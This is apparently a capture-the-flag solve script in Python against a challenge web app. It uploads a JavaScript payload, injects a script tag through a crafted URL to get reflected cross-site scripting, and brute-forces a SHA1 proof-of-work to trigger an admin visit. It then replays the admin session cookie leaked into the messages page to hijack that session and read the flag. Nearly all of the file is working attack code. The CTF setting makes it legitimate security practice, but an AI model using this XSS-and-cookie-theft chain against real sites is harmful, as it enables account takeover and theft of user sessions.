#!/usr/bin/env python3

import string
import re
from hashlib import sha1
from requests import Session
from itertools import product


DEBUG = False
BASE_URL = 'https://carbon.wutctf.space'
EMAIL = 'wut@wut.wut'
PASSWORD = 'bloodclaat'
CREDENTIALS = (EMAIL, PASSWORD)
SESSION = Session()


class AuthenticationException(Exception):
    pass


def authenticate(session, credentials):
    login_url = BASE_URL + '/login'
    email, password = credentials
    session.post(login_url, data={
        'mail': email,
        'password': password
    })
    if SESSION.cookies.get('session') == None:
        raise AuthenticationException(
            'Couldn\'t authenticate with {mail} and {pw} at {url}'.format(
                mail=email,
                pw=password,
                url=login_url
            )
        )


def header_is_consistent(header):
    open_endpoints = [
        '/',
        '/login',
        '/register',
        '/bogus',
    ]
    protected_endpoints = [
        '/send',
        '/messages',
        '/profile',
        '/upload',
        '/bogus',
    ]
    session = Session()
    header_contents = []
    for endpoint in open_endpoints:
        response = session.get(BASE_URL + endpoint)
        header_contents.append(session.headers.get(header))
    authenticate(session, CREDENTIALS)
    for endpoint in protected_endpoints:
        response = session.get(BASE_URL + endpoint)
        header_contents.append(session.headers.get(header))
    return len(set(header_contents)) == 1


def find_collision_fragment(s, h):
    s_pre, s_post = s.split('????')
    for c in product(string.ascii_letters + string.digits, repeat=4):
        guess = s_pre + ''.join(c) + s_post
        if sha1(guess.encode()).hexdigest() == h:
            return ''.join(c)


def main():
    authenticate(SESSION, CREDENTIALS)

    payload_script = './payload.js'
    response = SESSION.post(
        BASE_URL + '/upload',
        files={
            'file': open(payload_script, 'rb')
        }
    )
    uploaded_payload = re.search(r'/uploads/[^\s"]+', response.text).group(0)
    payload_url = '/fake-url</p><script src="{upload}"></script><p>'.format(upload=uploaded_payload)

    response = SESSION.get(BASE_URL + payload_url)
    token = re.search(r'<code>.+</code>', response.text).group(0)
    source, target = re.sub(r'</?code>|\s+|\'|sha1|\(|\)', '', token).split('==')
    collision_fragment = find_collision_fragment(source, target)

    SESSION.post(BASE_URL + '/report', data={
        'challenge': collision_fragment
    })

    response = SESSION.get(BASE_URL + '/messages')
    token = re.search(r'session=.+', response.text).group(0)
    admin_cookie = re.sub(r'session=' , '', token[:token.index('<')])

    SESSION.cookies.clear()
    SESSION.cookies.set('session', admin_cookie)

    response = SESSION.get(BASE_URL + '/messages')
    flag = re.search(r'(\w+_)+\w+', response.text).group(0)

    print(flag)


if __name__ == '__main__':
    main()
